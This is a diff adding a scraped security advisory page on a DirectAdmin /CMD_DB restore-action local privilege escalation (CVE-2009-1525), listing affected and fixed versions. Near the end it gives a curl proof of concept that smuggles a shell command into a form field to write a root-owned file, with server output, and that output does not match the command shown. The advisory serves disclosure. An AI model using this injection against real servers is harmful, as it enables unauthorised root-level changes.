@@ -1,0 +1,108 @@
+#SpeeDr00t@Black Falcon<br>#bid34678<p><b><span style="font-size: 18pt;">DirectAdmin '/CMD_DB' Restore Action Local Privilege Escalation Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/34678/info">info</a><br><a href="http://www.securityfocus.com/bid/34678/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/34678/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/34678/solution">solution</a><br><a href="http://www.securityfocus.com/bid/34678/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				34678
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2009-1525<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 22 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 14 2009 06:56PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				An anonymous reporter discovered this issue.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					JBMC Software DirectAdmin 1.33.3 <br/>
+					
+				
+					JBMC Software DirectAdmin 1.30.2 <br/>
+					
+				
+					JBMC Software DirectAdmin 1.30.1 <br/>
+					
+				
+					JBMC Software DirectAdmin  1.292<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					JBMC Software DirectAdmin 1.33.4 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	To exploit this issue, attackers need local access and readily available tools.<br/><br/>The following example is available:<br/><br/>On client: curl -n -F action=restore -F domain=www.example.com &amp;lt;http://www.example.com&amp;gt;<br/>-F 'file1=@database.gz' -F method=default -F 'name=poc_db;echo poc &amp;gt;<br/>/etc/poc' http://www.example2.com:2222/CMD_DB<br/>On server:<br/>$ ls -la /etc/poc<br/>-rw-r--r--  1 root root 5 Apr 22 10:30 /etc/poc<br/>$ cat /etc/poc<br/>test
+	
+		<ul>
+</ul>
+</div>
